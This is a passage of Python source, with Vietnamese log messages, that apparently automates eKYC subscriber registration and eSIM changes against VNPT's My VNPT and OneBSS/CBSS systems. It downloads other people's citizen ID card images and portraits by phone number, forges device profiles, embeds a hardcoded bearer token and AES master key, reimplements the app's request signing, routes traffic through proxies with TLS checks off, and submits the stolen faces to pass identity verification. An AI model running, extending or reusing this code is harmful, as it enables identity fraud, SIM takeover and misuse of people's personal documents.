            return item

    for item in images:
        if not isinstance(item, dict):
            continue
        for key in ('type', 'image_type', 'imageType', 'loai_anh',
                    'type_id', 'typeId'):
            if str(item.get(key, '')).strip() == '3':
                return item
    return None


def download_cccd_images(images, phone_fmt, headers=None, proxies=None,
                         log_cb=print):
    """Download CCCD front (type 1), CCCD back (type 2), and portrait (type 3) from OneBSS/CBSS."""
    front_path, back_path = _cccd_file_paths(phone_fmt)
    safe_phone = re.sub(r'[^0-9A-Za-z_-]', '_', str(phone_fmt or 'unknown'))
    portrait_path = os.path.join(TEMP_FACES_DIR, f'{safe_phone}.jpg')
    result = {
        'front': front_path if os.path.exists(front_path) and os.path.getsize(front_path) > 2048 else '',
        'back': back_path if os.path.exists(back_path) and os.path.getsize(back_path) > 2048 else '',
        'portrait': portrait_path if os.path.exists(portrait_path) and os.path.getsize(portrait_path) > 2048 else '',
    }
    by_type = {}
    for item in images or []:
        if isinstance(item, dict):
            item_type = str(item.get('type', '') or item.get('loai_anh', '')).strip()
            if not item_type:
                name = _onebss_image_name(item)
                if re.search(r'(?:^|[_-])1(?:[_-]|\.|$)', name): item_type = '1'
                elif re.search(r'(?:^|[_-])2(?:[_-]|\.|$)', name): item_type = '2'
                elif re.search(r'(?:^|[_-])3(?:[_-]|\.|$)', name): item_type = '3'
            if item_type in ('1', '2', '3') and item_type not in by_type:
                by_type[item_type] = item

    for item_type, key, path, label in (
        ('1', 'front', front_path, 'CCCD mat truoc'),
        ('2', 'back', back_path, 'CCCD mat sau'),
    ):
        item = by_type.get(item_type)
        if not item:
            if not result[key]:
                log_cb(f'  [CCCD] Khong tim thay anh {label} (type {item_type})')
            continue
        raw = _image_bytes_from_onebss(item, headers=headers, proxies=proxies)
        if len(raw) <= 2048:
            log_cb(f'  [CCCD] Khong tai duoc anh {label} (type {item_type})')
            continue
        try:
            with open(path, 'wb') as image_file:
                image_file.write(raw)
            result[key] = path
            log_cb(f'  [CCCD] Da tai {label} type={item_type}: {len(raw)//1024}KB -> {os.path.basename(path)}')
        except OSError as exc:
            log_cb(f'  [CCCD] Loi luu {label}: {exc}')

    portrait_item = _select_onebss_type3_image(images)
    if portrait_item:
        raw = _image_bytes_from_onebss(portrait_item, headers=headers, proxies=proxies)
        if len(raw) > 2048:
            try:
                with open(portrait_path, 'wb') as image_file:
                    image_file.write(raw)
                result['portrait'] = portrait_path
                log_cb(f'  [ANH] Da tai anh chan dung type 3: '
                       f'{len(raw)//1024}KB -> {os.path.basename(portrait_path)}')
            except OSError as exc:
                log_cb(f'  [ANH] Loi luu anh chan dung: {exc}')
        else:
            log_cb('  [ANH] Khong tai duoc anh thu 3')
    elif not result['portrait']:
        log_cb('  [ANH] Khong tim thay anh thu 3')

    # Do not let a duplicated CBSS payload masquerade as two CCCD sides.  A
    # few CBSS responses have returned the same bytes for type 1 and type 2;
    # forwarding that pair to eKYC is invalid and makes the server reject the
    # request.  Keep the files for inspection, but mark the back side missing
    # so downstream code will not upload a false pair.
    if result['front'] and result['back']:
        import hashlib as _hashlib
        try:
            with open(result['front'], 'rb') as _front_file:
                _front_hash = _hashlib.sha256(_front_file.read()).digest()
            with open(result['back'], 'rb') as _back_file:
                _back_hash = _hashlib.sha256(_back_file.read()).digest()
            if _front_hash == _back_hash:
                log_cb('  [CCCD] CBSS tra ve noi dung trung nhau cho type 1/type 2; khong danh dau mat sau hop le')
                result['back'] = ''
        except OSError:
                pass
    return result


def download_portrait_image(images, phone_fmt, headers=None, proxies=None,
                            log_cb=print):
    """Save only the OneBSS type-3 portrait; never write CCCD sides."""
    safe_phone = re.sub(r'[^0-9A-Za-z_-]', '_', str(phone_fmt or 'unknown'))
    portrait_path = os.path.join(TEMP_FACES_DIR, f'{safe_phone}.jpg')
    result = {
        'front': '',
        'back': '',
        'portrait': portrait_path if _valid_cached_image(portrait_path) else '',
    }
    portrait_item = _select_onebss_type3_image(images)
    if not portrait_item:
        if not result['portrait']:
            log_cb('[ANH] Khong tim thay anh chan dung type 3')
        return result
    raw = _image_bytes_from_onebss(portrait_item, headers=headers, proxies=proxies)
    if len(raw) <= 2048:
        log_cb('[ANH] Khong tai duoc anh chan dung type 3')
        return result
    part = f'{portrait_path}.{secrets.token_hex(4)}.part'
    try:
        with open(part, 'wb') as image_file:
            image_file.write(raw)
        os.replace(part, portrait_path)
    finally:
        if os.path.exists(part):
            try:
                os.remove(part)
            except OSError:
                pass
    result['portrait'] = portrait_path
    source_name = _onebss_image_name(portrait_item) or '(khong co ten)'
    log_cb(f'[ANH] Da tai anh mat type 3 ({source_name}): '
           f'{len(raw)//1024}KB -> {os.path.basename(portrait_path)}')
    return result


def fetch_cccd_from_onebss(phone, log_cb=print):
    """Lookup and cache CCCD sides and portrait from the OneBSS API."""
    phone_norm = _esim_normalize_msisdn(phone)
    if not phone_norm:
        raise EsimRegistrationError('phone is required for OneBSS image lookup')
    token = _ONEBSS_SESSION.get('token', '')
    if not token:
        raise EsimRegistrationError('OneBSS session is not logged in')
    device_id = _ONEBSS_SESSION.get('device_id', ONEBSS_DEVICE_ID)
    device_info = {
        'device_id': device_id, 'device_ip': 'Unknown', 'device_name': 'Web-Browser',
        'mac_address': 'Unknown', 'mobile_id': 'web-generated-id',
        'app_id': '1', 'app_version': ONEBSS_APP_VERSION, 'os_version': 'Android'
    }
    headers = {
        'Content-Type': 'application/json', 'Accept': 'application/json',
        'app-secret': base64.b64encode(json.dumps(device_info).encode('utf-8')).decode('ascii'),
        'authorization': f'Bearer {token}', 'selectedmenuid': '810241'
    }
    # The OneBSS app sends p_somay in national format (09...), while the
    # ACTIVE_SIM response uses 84... . Sending 84... succeeds with HTTP 200
    # but normally returns an empty data array.
    phone_fmt = '0' + phone_norm[2:] if phone_norm.startswith('84') else phone_norm
    log_cb(f'[ONEBSS] Tra cuu anh {phone_fmt}...')
    try:
        response = requests.post(
            ONEBSS_BASE + '/app-banhang/ccbs/tracuu_anh_thuebao',
            headers=headers, json={'p_somay': phone_fmt, 'menu_id': 810241},
            timeout=60, verify=False)
    except Exception as exc:
        raise EsimRegistrationError(f'OneBSS image lookup: {exc}') from exc
    if response.status_code != 200:
        try:
            detail = response.json().get('message', response.text[:300])
        except Exception:
            detail = response.text[:300]
        raise EsimRegistrationError(f'OneBSS image lookup HTTP {response.status_code}: {detail}')
    try:
        payload = response.json()
    except Exception as exc:
        raise EsimRegistrationError(f'OneBSS image lookup invalid JSON: {exc}') from exc

    images = payload.get('data') if isinstance(payload, dict) else []
    # Tolerate response wrappers used by different OneBSS releases.
    for _level in range(3):
        if isinstance(images, list):
            break
        if not isinstance(images, dict):
            images = []
            break
        if any(key in images for key in (
                'image_base', 'base64', 'url', 'image_url', 'type', 'loai_anh')):
            images = [images]
            break
        nested = next((images.get(key) for key in (
            'items', 'content', 'list', 'result', 'data'
        ) if images.get(key) is not None), [])
        images = nested
    if not isinstance(images, list):
        images = []
    log_cb(f'[ONEBSS] HTTP {response.status_code}; nhan {len(images)} ban ghi anh.')
    if not images:
        log_cb(f'[ONEBSS] Khong co anh cho thue bao {phone_fmt}.')
    return download_cccd_images(
        images, phone_fmt, headers=headers, log_cb=log_cb
    )


def ensure_cccd_images(phone, log_cb=print):
    """Resolve local CCCD & portrait paths in anh/, downloading any missing ones from CBSS/OneBSS."""
    phone_norm = _esim_normalize_msisdn(phone)
    if not phone_norm:
        raise EsimRegistrationError('phone is required for CCCD image lookup')
    phone_fmt = '0' + phone_norm[2:] if phone_norm.startswith('84') else phone_norm
    default_front, default_back = _cccd_file_paths(phone_fmt)
    front_path = _find_cccd_front(phone_fmt) or default_front
    back_path = _find_cccd_back(phone_fmt) or default_back
    portrait_path = _find_esim_portrait(phone_fmt)

    def valid(path):
        try:
            return bool(path and os.path.isfile(path) and os.path.getsize(path) > 2048)
        except OSError:
            return False

    result = {
        'front': front_path if valid(front_path) else '',
        'back': back_path if valid(back_path) else '',
        'portrait': portrait_path if valid(portrait_path) else '',
        'source': 'local',
    }
    # Neu da du ca 3 anh trong thu muc anh/ thi su dung luon
    if result['front'] and result['back'] and result['portrait']:
        log_cb('[ANH] Da co du anh CCCD va chan dung trong thu muc anh; bo qua CBSS/OneBSS.')
        return result

    # Neu thieu bat ky anh nao, thu CBSS truc tiep
    missing_items = []
    if not result['front']: missing_items.append('CCCD mat truoc')
    if not result['back']: missing_items.append('CCCD mat sau')
    if not result['portrait']: missing_items.append('chan dung')
    log_cb(f"[ANH] Thu muc anh thieu {', '.join(missing_items)}; dang tim tai tu CBSS/OneBSS...")

    if _CBSS_RUNTIME.logged_in or _CBSS_RUNTIME.has_saved_session():
        try:
            direct = fetch_images_from_cbss_direct(phone_norm, log_cb=log_cb)
            if valid(direct.get('portrait')) and not result['portrait']:
                result['portrait'] = direct['portrait']
                result['source'] = 'local+cbss-direct'
            if valid(direct.get('front')) and not result['front']:
                result['front'] = direct['front']
            if valid(direct.get('back')) and not result['back']:
                result['back'] = direct['back']
        except Exception as exc:
            log_cb(f'[CBSS-DIRECT] Khong tai duoc qua CBSS direct: {exc}; chuyen OneBSS...')
            direct = {}
    else:
        direct = {}
        log_cb('[CBSS-DIRECT] Chua co phien CBSS; bo qua va dung OneBSS.')

    if result['front'] and result['back'] and result['portrait']:
        return result

    # Neu van con thieu, chuyen sang OneBSS API
    if not _ONEBSS_SESSION.get('token', ''):
        log_cb('[ONEBSS] Chua dang nhap OneBSS; giu ket qua anh hien co.')
        return result

    log_cb('[ONEBSS] Tra cuu va tai cac anh con thieu tu OneBSS API...')
    try:
        fetched = fetch_cccd_from_onebss(phone_norm, log_cb=log_cb)
        if valid(fetched.get('front')) and not result['front']:
            result['front'] = fetched['front']
        if valid(fetched.get('back')) and not result['back']:
            result['back'] = fetched['back']
        if valid(fetched.get('portrait')) and not result['portrait']:
            result['portrait'] = fetched['portrait']
            result['source'] = 'local+onebss'
    except Exception as exc:
        log_cb(f'[ONEBSS] Khong tai duoc tu OneBSS: {exc}')

    return result

def run_ekyc_auto(phone, password="", otp="", use_local_img=True, img_type='3', log_cb=print, tag=''):
    """Module-level automated eKYC flow for CLI/Telegram Bot/External calls."""
    import hashlib, json, os, subprocess, sys, threading, time, uuid, requests
    from Crypto.PublicKey import RSA as _RSA2
    from Crypto.Signature import pkcs1_15 as _pkcs15
    from Crypto.Hash import SHA256 as _SHA256
    from Crypto.Cipher import AES as _AES2
    from Crypto.Util.Padding import pad as _pad2, unpad as _unpad2

    _proxy_dict = None
    try:
        _proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
        if _proxy_dict:
            log_cb(f"[{tag}][PROXY] Đã bật proxy cho luồng eKYC" if tag else "[PROXY] Đã bật proxy cho luồng eKYC")
    except Exception as _proxy_exc:
        if proxy_manager.is_required():
            return False, '', '', f"PROXY LỖI: {_proxy_exc}"
        log_cb(f"[PROXY] Không dùng được proxy, tiếp tục kết nối trực tiếp: {_proxy_exc}")

    prefix = f"[{tag}]" if tag else ""
    _AMKEY = 'dqeqgig123ndb123dsfsdf23g4d56jfq'
    _IV2 = bytes(16)
    _INIT_SPK = ('MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEZrm+72VDaEzV4PAzYlt'
                 'gnWQnhlYYjD/i1ABMB2UKU9wVNrKDXPwLoI1+yE2AnkbqZeBy1dXSNuxvhC030nN'
                 '78kav8cX3QE2JsQf6Z/dadZcGCOL41x4AVcynDt+70QGtur5tHU4D56MQltnCpX6D'
                 'mDlE2foe9XUQcd5XyHc2x8dnm9OZLCUhjK2xWTPRk80Uu/aU6rb1QtCB59/YWXsyf'
                 'eaLHuvuKBPeMUSPlIDRj5zN6UCPZMsDUZxdSzQIaisS3I1oKGOMaAeAgMcISFUM/8r'
                 'yH8yzvUAy0ANYjbyW8dj63WHHyXZcXkoLyMAmuze30oHjtE61iVmTiciYpYYQIDAQAB')

    def _aenc2(pt):
        c = _AES2.new(_AMKEY.encode(), _AES2.MODE_CBC, _IV2)
        return __import__('base64').b64encode(c.encrypt(_pad2(pt.encode(), 16))).decode()
    def _adec2(b64):
        raw = __import__('base64').b64decode(b64)
        c = _AES2.new(_AMKEY.encode(), _AES2.MODE_CBC, _IV2)
        return _unpad2(c.decrypt(raw), 16).decode('utf-8')

    p = phone.strip()
    if p.startswith('84') and len(p) > 10: digits = p[2:]
    elif p.startswith('+84'): digits = p[3:]
    elif p.startswith('0'): digits = p[1:]
    else: digits = p
    msisdn_84 = '84' + digits
    phone_fmt = '0' + digits

    _prof   = _random_device_profile()
    _DI     = _prof['di']
    _MODEL  = _prof['model']
    _OS_VER = _prof['android_ver']
    _FCM    = _prof['fcm_token']
    _MAC    = _prof['mac']
    _BT     = 'Bearer a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b'

    try:
        log_cb(f"{prefix}[1/3] ng k RSA key (initDevice)...")
        key = _RSA2.generate(2048)
        priv_der = key.export_key('DER', pkcs=8)
        priv_b64 = __import__('base64').b64encode(priv_der).decode().replace('\n','').replace('\r','')
        pub_b64  = __import__('base64').b64encode(key.publickey().export_key('DER')).decode().replace('\n','').replace('\r','')
        req_json = __import__('json').dumps({'clientPublicKey': pub_b64, 'osName': _OS_VER, 'deviceName': _MODEL}, separators=(',',':'))
        rd   = _aenc2(req_json)
        h    = _SHA256.new(rd.encode('utf-8'))
        sig  = __import__('base64').b64encode(_pkcs15.new(key).sign(h)).decode().replace('\n','')
        spk_obj = _RSA2.import_key(__import__('base64').b64decode(_INIT_SPK))
        ksz  = (spk_obj.n.bit_length() + 7) // 8
        pt   = _AMKEY.encode('utf-8')
        c_   = pow(int.from_bytes(b'\x00'*(ksz-len(pt))+pt,'big'), spk_obj.e, spk_obj.n)
        xsec = __import__('base64').b64encode(c_.to_bytes(ksz,'big')).decode().replace('\n','')
        _s = requests.Session()
        _s.trust_env = False
        if _proxy_dict:
            _s.proxies.update(_proxy_dict)
        _s.mount('https://', DhAdapter())
        ir = _s.post('https://api-myvnpt.vnpt.vn/tel_service/device/initDevice',
                       headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                                'Cache-Control':'no-cache','Channel-Code':'APP','Device-Info':_DI,
                                'Language':'vi_VN','partnerCode':'MYVNPT','User-Agent':'okhttp/4.7.2',
                                'X-Secret-Key':xsec,'X-Signature':sig},
                       json={'requestData': rd}, timeout=60, verify=False)
        id_d = ir.json()
        id_data = id_d.get('data','')
        if not id_data:
            err = f"initDevice LI: {id_d.get('message','?')} ec={id_d.get('errorCode')}"
            log_cb(f"{prefix}[1/3] {err}")
            return False, '', '', err
        new_spk = __import__('json').loads(_adec2(id_data)).get('serverPublicKey','')
        if not new_spk:
            err = "Khng c serverPublicKey!"
            log_cb(f"{prefix}[1/3] {err}")
            return False, '', '', err
        log_cb(f"{prefix}[1/3] initDevice OK!")

        if otp:
            log_cb(f"{prefix}[2/3] ng nhp bng OTP {msisdn_84}...")
            lr = _s.post('https://api-myvnpt.vnpt.vn/mapi_v2/services/authen_msisdn',
                           headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                                    'Device-Info':_DI,'Language':'vi_VN','User-Agent':'okhttp/4.7.2'},
                           json={'device_info':_MODEL,'fcm_registration_token':_FCM,
                                 'mode':'otp','msisdn':msisdn_84,'otp':otp},
                           timeout=60, verify=False)
        else:
            log_cb(f"{prefix}[2/3] ng nhp bng mt khẩu {msisdn_84}...")
            pw_md5 = hashlib.md5(password.encode('utf-8')).hexdigest().upper()
            lr = _s.post('https://api-myvnpt.vnpt.vn/mapi_v2/services/authen_msisdn',
                           headers={'Authorization':_BT,'Content-Type':'application/json; charset=UTF-8',
                                    'Device-Info':_DI,'Language':'vi_VN','User-Agent':'okhttp/4.7.2'},
                           json={'device_info':_MODEL,'fcm_registration_token':_FCM,
                                 'mode':'password','msisdn':msisdn_84,'password':pw_md5},
                           timeout=60, verify=False)
        ld = lr.json()
        ec = str(ld.get('error_code','?'))
        sess_val = ld.get('session','')
        if ec != '0' or not sess_val:
            err = f"Li ng nhp: ec={ec} | msg={ld.get('message','?')}"
            log_cb(f"{prefix}[2/3] {err}")
            return False, '', '', err
        log_cb(f"{prefix}[2/3] Login OK!")

        _tid = f"{uuid.uuid4().hex[:8]}_{threading.get_ident()}"
        _session_file = os.path.join(SESSION_TEMP_DIR, f'device_session_{_tid}.json')
        existing = _load_session_data() or {}
        existing.update({
            'rsa_key_private': _aenc2(priv_b64),
            'server_public_key': _aenc2(new_spk),
            'login_session': sess_val,
            'API_SESSION_ID': sess_val,
            'phone_number_login': ld.get('msisdn', msisdn_84),
            'KEY_ENCRYPT_AES': _AMKEY,
            'BEARER_TOKEN': _BT,
            'DEVICE_INFO': _DI,
            'MAC_ADDRESS': _MAC,
            '_saved_at': time.strftime('%Y-%m-%d %H:%M:%S'),
        })
        with open(_session_file, 'w', encoding='utf-8') as _fj:
            json.dump(existing, _fj, ensure_ascii=False, indent=2)
        with open(DEVICE_SESSION_JSON, 'w', encoding='utf-8') as _fj:
            json.dump(existing, _fj, ensure_ascii=False, indent=2)

        log_cb(f"{prefix}[3/3] Chuẩn b nh tham chiu và bt u eKYC...")
        face_path = os.path.join(TEMP_FACES_DIR, phone_fmt + '.jpg')
        os.makedirs(os.path.dirname(face_path), exist_ok=True)
        img_ok = False
        _cccd_front, _cccd_back = _cccd_file_paths(phone_fmt)
        cccd_paths = {
            'front': _cccd_front if os.path.exists(_cccd_front) and os.path.getsize(_cccd_front) > 2048 else '',
            'back': _cccd_back if os.path.exists(_cccd_back) and os.path.getsize(_cccd_back) > 2048 else '',
        }

        if use_local_img:
            if os.path.exists(face_path) and os.path.getsize(face_path) > 2048:
                log_cb(f"{prefix}[LOCAL] Sử dụng ảnh có sẵn: anh/{phone_fmt}.jpg")
                img_ok = True
            else:
                log_cb(f"{prefix}[LOCAL] Cha c nh local -> Thử ti từ ONEBSS...")

        # Nguon 1: CBSS truc tiep. Runtime se tu dung tai khoan CBSS da luu
        # neu phien hien tai chua mo (phu hop ca CLI --no-gui).
        if not img_ok:
            try:
                direct_paths = fetch_images_from_cbss_direct(
                    msisdn_84,
                    log_cb=lambda message: log_cb(f"{prefix}{message}"),
                )
                if direct_paths.get('portrait'):
                    face_path = direct_paths['portrait']
                    img_ok = _valid_cached_image(face_path)
            except Exception as direct_exc:
                log_cb(f"{prefix}[CBSS-DIRECT] Loi: {direct_exc}; fallback OneBSS...")

        # OneBSS fallback chi luu anh chan dung type 3, khong tai CCCD.
        if not img_ok:
            for attempt in range(3):
                try:
                    log_cb(f"{prefix}[ONEBSS] Tra cứu CBSS {msisdn_84} (lần {attempt+1}/3)...")
                    onebss_token = _ONEBSS_SESSION.get('token', '')
                    if not onebss_token:
                        log_cb(f"{prefix}[ONEBSS] Chua dang nhap/token rong.")
                        break
                    _di_bss = {"device_id": _ONEBSS_SESSION.get('device_id', '0f8c2d3fb0c51653'),
                               "device_ip": "Unknown", "device_name": "Web-Browser",
                               "mac_address": "Unknown", "mobile_id": "web-generated-id",
                               "app_id": "1", "app_version": ONEBSS_APP_VERSION, "os_version": "Android"}
                    import base64 as _b64x
                    app_secret = _b64x.b64encode(json.dumps(_di_bss).encode('utf-8')).decode('utf-8')
                    hdrs = {'Content-Type': 'application/json', 'Accept': 'application/json',
                            'app-secret': app_secret, 'authorization': f'Bearer {onebss_token}', 'selectedmenuid': '810241'}
                    r_obs = requests.post('https://api-onebss.vnpt.vn/app-banhang/ccbs/tracuu_anh_thuebao',
                                          headers=hdrs, json={'p_somay': msisdn_84, 'menu_id': 810241},
                                          timeout=60, verify=False, proxies=_proxy_dict)
                    if r_obs.status_code == 200:
                        obs_j = r_obs.json()
                        images = obs_j.get('data') or []
                        portrait_result = download_portrait_image(
                            images, phone_fmt, headers=hdrs, proxies=_proxy_dict,
                            log_cb=lambda message: log_cb(f"{prefix}{message}"),
                        )
                        if portrait_result.get('portrait'):
                            face_path = portrait_result['portrait']
                            img_ok = _valid_cached_image(face_path)
                        if not img_ok and isinstance(images, list):
                            best_img = _select_onebss_type3_image(images)
                            if best_img:
                                b64_data = best_img.get('image_base') or best_img.get('base64') or ''
                                img_url = best_img.get('url') or best_img.get('image_url') or ''
                                if b64_data and len(b64_data) > 500:
                                    raw_bytes = _b64x.b64decode(b64_data)
                                    if len(raw_bytes) > 2048:
                                        with open(face_path, 'wb') as _fi: _fi.write(raw_bytes)
                                        log_cb(f"{prefix}[ONEBSS] Đã lưu {len(raw_bytes)//1024}KB -> anh/{phone_fmt}.jpg")
                                        img_ok = True
                                elif img_url:
                                    if img_url.startswith('//'): img_url = 'https:' + img_url
                                    elif img_url.startswith('/'): img_url = 'https://api-onebss.vnpt.vn' + img_url
                                    r2 = requests.get(
                                        img_url, headers=hdrs, timeout=60, verify=False,
                                        proxies=_proxy_dict
                                    )
                                    if len(r2.content) > 2048:
                                        with open(face_path, 'wb') as _fi: _fi.write(r2.content)
                                        log_cb(f"{prefix}[ONEBSS]  ti URL {len(r2.content)//1024}KB")
                                        img_ok = True
                except Exception as _ex:
                    log_cb(f"{prefix}[ONEBSS] Li ti nh: {_ex}")
                if img_ok:
                    break
                time.sleep(3)

        if not img_ok:
            log_cb(f"{prefix}[ONEBSS]  KHNG C ẢNH THAM CHIẾU -> SKIP")
            try: os.remove(_session_file)
            except: pass
            return False, '', '', 'KHNG C ẢNH THAM CHIẾU (ONEBSS & LOCAL)'

        if not (cccd_paths['front'] and cccd_paths['back']):
            log_cb(f"{prefix}[CCCD] Khong tai CCCD theo cau hinh; eKYC tiep tuc voi anh mat.")

        # Run subprocess ekyc
        if getattr(sys, 'frozen', False):
            cmd = [sys.executable, '--no-gui', '--face', face_path, '--skip-device', '--msisdn', msisdn_84, '--session-file', _session_file]
        else:
            cmd = [sys.executable, os.path.abspath(__file__), '--no-gui', '--face', face_path, '--skip-device', '--msisdn', msisdn_84, '--session-file', _session_file]
        if cccd_paths['front']:
            cmd += ['--cccd-front', cccd_paths['front']]
        if cccd_paths['back']:
            cmd += ['--cccd-back', cccd_paths['back']]
        child_env = os.environ.copy()
        if _proxy_dict:
            child_env["HTTP_PROXY"] = _proxy_dict["http"]
            child_env["HTTPS_PROXY"] = _proxy_dict["https"]
        proc = subprocess.Popen(
            cmd, cwd=BASE_DIR, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            encoding='utf-8', errors='replace', env=child_env
        )
        success = False
        full_name = ''; msisdn_result = ''; ekyc_flow = ''; err_msg = ''
        child_output_tail = []
        for line in proc.stdout:
            line = line.rstrip()
            log_cb(f"{prefix} {line}" if prefix else line)
            safe_line = re.sub(
                r'(?i)\b(authorization|bearer|token|session|secret|signature|requestdata)'
                r'\s*[:=]\s*[^\s,|}]+',
                lambda match: match.group(1) + '=[REDACTED]',
                line,
            ).strip()
            if safe_line and any(character.isalnum() for character in safe_line):
                child_output_tail.append(safe_line[:600])
                child_output_tail = child_output_tail[-40:]
            if '*** DKTTTB THANH CONG! ***' in line or '*** DKTTTB DA HOAN THANH TRUOC DO!' in line: success = True
            if success and 'fullName:' in line: full_name = line.split('fullName:')[-1].strip()
            if success and 'msisdnChangeImei:' in line: msisdn_result = line.split('msisdnChangeImei:')[-1].strip()
            if success and 'ekycFlow:' in line: ekyc_flow = line.split('ekycFlow:')[-1].strip()
            if 'FAILED:' in line: err_msg = line.split('FAILED:', 1)[-1].strip()
        proc.wait()
        if not success and not err_msg:
            error_markers = (
                'failed', 'error', 'exception', 'traceback', 'timeout',
                'invalid', 'denied', 'thất bại', 'that bai', 'từ chối',
                'không thành công', 'khong thanh cong', 'không hợp lệ',
                'khong hop le', 'skipped',
            )
            last_error_line = next(
                (candidate for candidate in reversed(child_output_tail)
                 if any(marker in candidate.lower() for marker in error_markers)),
                child_output_tail[-1] if child_output_tail else '',
            )
            err_msg = f"Tiến trình eKYC kết thúc mã {proc.returncode}"
            if last_error_line:
                err_msg += f" | {last_error_line}"
            else:
                err_msg += " | Không có dữ liệu stdout từ tiến trình eKYC"
            log_cb(f"{prefix}[AUTO] {err_msg}")
        try: os.remove(_session_file)
        except: pass
        return success, full_name, msisdn_result, err_msg
    except Exception as ex:
        log_cb(f"{prefix}[AUTO] LI EXCEPTION: {ex}")
        return False, '', '', str(ex)


class EsimRegistrationError(RuntimeError):
    """Raised when the eSIM workflow cannot continue with the supplied data."""


def _esim_normalize_msisdn(value):
    value = str(value or '').strip().replace(' ', '')
    if value.startswith('+84'):
        return '84' + value[3:]
    if value.startswith('0'):
        return '84' + value[1:]
    return value


def _esim_decrypt_with_master(value, master_key):
    if not value:
        return ''
    raw = base64.b64decode(value)
    cipher = AES.new(master_key.encode('utf-8'), AES.MODE_CBC, IV_ZEROS)
    return unpad(cipher.decrypt(raw), AES.block_size).decode('utf-8')


def _esim_file_to_b64(path_or_b64):
    """Convert a local image path/data URI to the Base64 value expected by v2."""
    value = str(path_or_b64 or '')
    if not value:
        return ''
    if os.path.isfile(value):
        with open(value, 'rb') as image_file:
            return base64.b64encode(image_file.read()).decode('ascii')
    if value.lower().startswith('data:') and ',' in value:
        return value.split(',', 1)[1]
    return value


def _esim_deep_find(value, *names):
    wanted = {str(name).lower() for name in names}
    if isinstance(value, dict):
        for key, item in value.items():
            if str(key).lower() in wanted and item not in (None, '', [], {}):
                return item
        for item in value.values():
            found = _esim_deep_find(item, *names)
            if found not in (None, '', [], {}):
                return found
    elif isinstance(value, list):
        for item in value:
            found = _esim_deep_find(item, *names)
            if found not in (None, '', [], {}):
                return found
    return None


def _esim_error_code(value):
    code = _esim_deep_find(value, 'errorCode', 'error_code', 'code', 'statusCode')
    if code is None:
        return ''
    return str(code).strip().lower()


def _esim_is_success(value):
    return _esim_error_code(value) in ('', '0', '00', '200', 'success', 'true')


def _esim_load_config(config):
    if isinstance(config, str):
        with open(config, 'r', encoding='utf-8') as config_file:
            config = json.load(config_file)
    if not isinstance(config, dict):
        raise EsimRegistrationError('esim config must be a JSON object')
    return config.get('esim', config)


def _esim_save_result(result, path=None):
    output_path = path or os.path.join(HISTORY_DIR, 'esim_result.json')
    if not os.path.isabs(str(output_path)):
        output_path = os.path.join(BASE_DIR, str(output_path))
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    try:
        with open(output_path, 'w', encoding='utf-8') as result_file:
            json.dump(result, result_file, ensure_ascii=False, indent=2)
    except OSError:
        pass
    return output_path


def login_myvnpt_session(phone, password='', session_file=None, log_cb=print,
                         otp='', mirror_default=True, device_profile=None,
                         inherit_default=True):
    """Login My VNPT with password or OTP and persist the device session.

    This mirrors the existing DKTTTB initDevice/authen_msisdn sequence.  The
    plaintext password/OTP is used only for the request and is never written
    to the session file.  ``password`` remains the second positional argument
    so existing DKTTTB/eSIM callers stay backward compatible.
    """
    import hashlib as _hashlib
    from Crypto.PublicKey import RSA as _RSA
    from Crypto.Signature import pkcs1_15 as _pkcs15
    from Crypto.Hash import SHA256 as _SHA256
    from Crypto.Util.Padding import pad as _pad, unpad as _unpad

    phone_norm = _esim_normalize_msisdn(phone)
    if not phone_norm:
        raise EsimRegistrationError('My VNPT login phone is required')
    if not password and not otp:
        raise EsimRegistrationError('Cần mật khẩu hoặc OTP đăng nhập My VNPT')

    profile = dict(device_profile or _random_device_profile())
    device_info = profile['di']
    model = profile['model']
    fcm_token = profile['fcm_token']
    mac_address = profile['mac']
    bearer = 'Bearer a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b'
    init_server_key = (
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEZrm+72VDaEzV4PAzYlt'
        'gnWQnhlYYjD/i1ABMB2UKU9wVNrKDXPwLoI1+yE2AnkbqZeBy1dXSNuxvhC030nN'
        '78kav8cX3QE2JsQf6Z/dadZcGCOL41x4AVcynDt+70QGtur5tHU4D56MQltnCpX6D'
        'mDlE2foe9XUQcd5XyHc2x8dnm9OZLCUhjK2xWTPRk80Uu/aU6rb1QtCB59/YWXsyf'
        'eaLHuvuKBPeMUSPlIDRj5zN6UCPZMsDUZxdSzQIaisS3I1oKGOMaAeAgMcISFUM/8r'
        'yH8yzvUAy0ANYjbyW8dj63WHHyXZcXkoLyMAmuze30oHjtE61iVmTiciYpYYQIDAQAB')

    def aenc(value):
        cipher = AES.new(AES_MASTER_KEY.encode('utf-8'), AES.MODE_CBC, IV_ZEROS)
        return base64.b64encode(cipher.encrypt(_pad(value.encode('utf-8'), AES.block_size))).decode('ascii')

    def adec(value):
        raw = base64.b64decode(value)
        cipher = AES.new(AES_MASTER_KEY.encode('utf-8'), AES.MODE_CBC, IV_ZEROS)
        return _unpad(cipher.decrypt(raw), AES.block_size).decode('utf-8')

    key = _RSA.generate(2048)
    private_b64 = base64.b64encode(key.export_key('DER', pkcs=8)).decode('ascii')
    public_b64 = base64.b64encode(key.publickey().export_key('DER')).decode('ascii')
    init_plain = json.dumps({'clientPublicKey': public_b64, 'osName': profile['android_ver'],
                             'deviceName': model}, separators=(',', ':'))
    init_data = aenc(init_plain)
    init_sig = base64.b64encode(_pkcs15.new(key).sign(_SHA256.new(init_data.encode('utf-8')))).decode('ascii')
    init_pub = _RSA.import_key(base64.b64decode(init_server_key))
    modulus_size = (init_pub.n.bit_length() + 7) // 8
    master_bytes = AES_MASTER_KEY.encode('utf-8')
    encrypted_master = pow(int.from_bytes(b'\x00' * (modulus_size - len(master_bytes)) + master_bytes, 'big'),
                           init_pub.e, init_pub.n)
    init_secret = base64.b64encode(encrypted_master.to_bytes(modulus_size, 'big')).decode('ascii')

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        proxy_dict = None
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
